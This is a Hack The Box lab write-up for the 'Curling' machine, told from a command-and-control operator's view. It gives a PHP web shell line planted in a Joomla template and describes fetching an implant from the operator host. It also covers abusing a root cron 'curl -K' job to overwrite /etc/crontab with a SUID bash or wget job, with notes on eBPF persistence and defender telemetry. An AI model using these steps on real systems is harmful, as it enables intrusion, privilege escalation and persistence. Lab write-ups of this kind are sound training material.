# Curling — HTB Write-up (C2 operator)

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Curling (Easy, Linux)  
**Host:** `curling.htb` (Ubuntu, Apache 2.4.29, Joomla Protostar)  
**Scope:** HTB VPN / personal lab only  

> **No flags** in this document.

Operator goal: **webshell → implant**, then **new table rows** for floris and root instead of faking uid 0 on `apache`.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | Apache 2.4.29, Joomla Protostar |
| Creds | `/secret.txt` Base64; CMS username from a post |
| Foothold | `/administrator/` → Protostar `index.php` → `system($_REQUEST[…])` |
| C2 1 | Implant as **www-data** |
| User | `/home/floris/password_backup` (xxd + nested bz2/gz/tar) |
| C2 2 | `elevate -u floris -p` — Ubuntu 18.04 `su` needs TTY → `python3 pty` then `setsid` ELF |
| Root | cron `curl -K /home/floris/admin-area/input` as root; floris **RW** on `input` |
| C2 3 | cron drops/execs implant as root — **new PID**, not elevate-in-place |

---

## 1. Recon / Joomla

```bash
nmap -sC -sV <TARGET_IP>
echo '<TARGET_IP> curling.htb' | sudo tee -a /etc/hosts
```

`/secret.txt` is Base64 (lab password for the CMS). A blog post names the admin. Login `/administrator/` (Protostar).

Template edit on `index.php`:

```php
system($_REQUEST['pwn']);
```

That is RCE as **www-data**. Pull an implant (static ELF) from the operator host; do not live in `bash -c` forever.

---

## 2. www-data → floris

`/home/floris/password_backup` looks like hex. `xxd -r` then nested **bz2 / gzip / tar** until `password.txt`.

`elevate -u floris -p` on this box:

- Ubuntu 18.04 `su` **requires a TTY**.
- Implant path: `python3` PTY → `su floris -c 'setsid <ELF>'`.
- Result: **new callback** as floris (new PID under `/dev/shm` or similar), original www-data row stays.

Do not paint the apache PID as floris.

---

## 3. floris → root (intended)

Cron as root:

```text
curl -K /home/floris/admin-area/input
```

`floris` can write `input`. `curl -K` accepts `url` and `output`. Point `output` at `/etc/crontab`, plant a root job (SUID bash or wget of the same ELF).

`elevate spawn` from the floris row **copies** the ELF; the **existing PID stays floris**. Root is the **cron-started process** checking in as uid 0.

Restore crontab after the callback so the job does not keep spawning.

---

## 4. BPF note (lab implant)

On 4.15, objects compiled with a current Kali clang fail **verifier** (`unknown insn class`, reserved `BPF_STX`). www-data gets EPERM (expected). Root can load the syscall and still get dropped. Hide/persist is not a free lunch on this kernel — rebuild `.o` against 4.15 or skip.

---

## What blue still sees

| Step | Telemetry |
|------|-----------|
| Template write | Joomla audit / `index.php` mtime, PHP `system` |
| Implant | odd ELF in `/dev/shm`, outbound HTTP to operator |
| `su` / PTY | `utmp`/pty, `su` from www-data |
| cron | crontab mtime, `curl -K` as root, SUID `/bin/bash` |

No inbound SSH is required for the operator channel after the first implant. Floris SSH is optional convenience, not the C2 path.
